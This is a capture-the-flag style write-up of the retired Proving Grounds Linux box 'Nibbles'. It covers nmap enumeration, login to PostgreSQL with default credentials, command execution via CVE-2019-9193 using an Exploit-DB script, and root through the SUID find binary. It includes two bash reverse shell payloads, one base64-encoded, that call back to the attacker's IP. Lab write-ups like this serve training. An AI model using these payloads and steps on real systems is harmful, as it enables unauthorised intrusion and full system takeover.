---
machine: Nibbles
platform: Proving Grounds
category: Linux
difficulty: Easy
tags: [postgresql, cve-2019-9193, suid, default-credentials]
date: 2026-07-23
status: retired
summary: A Debian box exposing FTP, SSH, a webapp, and PostgreSQL — testing default database credentials, a known authenticated command-execution vulnerability in PostgreSQL's `COPY ... FROM PROGRAM`, and a classic SUID binary abuse via GTFOBins for root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/nibbles]
└─$ nmap-full 192.168.142.47
[*] Running fast port discovery on 192.168.142.47...
[sudo] password for kali: 
[*] Open ports: 21,22,80,139,445,5437
[*] Running full scan on 192.168.142.47...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 07:58 -0400
Nmap scan report for 192.168.142.47
Host is up (0.032s latency).

PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
```

We have a webapp, samba share, ftp server (presumably no anon login), and most intrestingly, a Postgresql database.

We attempt anonymous smb and ftp login with nxc with no prevail. Maybe we can get some creds from the webapp.

We find a link to a random image: `http://target/nightmare.jpg` and a link to another page: `http://target/page2.html`. I feroxbust the webapp to see if we can find any interesting listings

```text
200      GET      169l      550w     4115c http://target/page2.html
200      GET      208l     1213w    90445c http://target/pic.png
200      GET      849l     5242w   413918c http://target/nightmare.jpg
200      GET       30l      201w     1272c http://target/
```

None of these seem to be significant.

## Foothold

We look up default creds for postgresql and find `postgres` may be an option. I use `postgres` for the database name, username, and password:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/nibbles]
└─$  psql -h target -p 5437 -d postgres -U postgres -W
Password: 
psql (18.4 (Debian 18.4-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=# 
```

Upon looking for a foothold I found some authenticated RCE's for postgresql. I will turn to this as my next option if I dont find anything manually traversing the website.

I will use this postgresql cheatsheet for navigation: https://quickref.me/postgres.html

```bash
postgres=# \l
                                                     List of databases
   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | 
 template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
(3 rows)

postgres=# \c postgres
Password: 
psql (18.4 (Debian 18.4-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
You are now connected to database "postgres" as user "postgres".

postgres=# \dt
Did not find any tables.

postgres=# 
```

It seems our `postgres` database is empty.

We can find that we are running version 11.7 however:

```bash
postgres=# SHOW SERVER_VERSION;
        server_version        
------------------------------
 11.7 (Debian 11.7-0+deb10u1)
(1 row)
```

This matches up with the google overview I found about authenticated RCE related to Postgres:

```text
**PostgreSQL versions 11.3 to 11.9 are vulnerable to authenticated Remote Code Execution (RCE)** via **CVE-2019-9193**, which allows attackers with database access to execute arbitrary system commands. 

This vulnerability exists because PostgreSQL versions **9.3 through 11.7** (and potentially later unpatched versions like 11.9 if not updated) allow the `COPY ... FROM PROGRAM` command to be executed by superusers or members of the `pg_execute_server_program` group.
```

We will attempt this authenticated RCE exploit: https://www.exploit-db.com/exploits/50847

Our exploit worked!

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/nibbles]
└─$ python3 rce.py -i 192.168.142.47 -p 5437 -d postgres -c whoami -U postgres -P postgres

[+] Connecting to PostgreSQL Database on 192.168.142.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _451cb8b76e07adaa5a3e7e7aa723220d
[+] Command executed

postgres

[+] Deleting table _451cb8b76e07adaa5a3e7e7aa723220d
```

Now we just need to throw in a bash revshell and we should have a shell as root.

I have trouble passing the following payloads to the -c command as it would either break the local python script command or fail to interpret correctly inside the exploit on the server's side.
- `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyNS80NDUgMD4mMQ== | base64 -d | bash`
- `bash -i >& /dev/tcp/192.168.45.225/445 0>&1`

I ended up hardcoding my exploit by replacing the call for `args.command` in the exploit with my base64 encoded revshell. I then ran the command with a valid command argument and it fired my hardcoded revshell, giving me a shell as postgres.

With our postgres user we can access user wilson's home directory to find the user.txt and a directory called ftp:

```bash
postgres@nibbles:/home$ cd wilson
postgres@nibbles:/home/wilson$ ls
ftp  local.txt
postgres@nibbles:/home/wilson$ cat local.txt
```

The directory is empty however.

## Privilege Escalation

I go down a rabbithole searching for credentials in the postgres database for the wilson user for a potential lateral movement but wasn't able to find anything.

I began my manual privesc enumeration and when looking for SUID binaries, I saw `/usr/bin/find` which I found on gtfobins.org and exploited to gain a root shell.:

```bash
postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \; # SUID: runs as file owner (root)
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 34896 Jan  7  2019 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount

postgres@nibbles:/var/lib/postgresql/11/main$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

We can retrieve the root flag from the /root directory and the box is pwned!
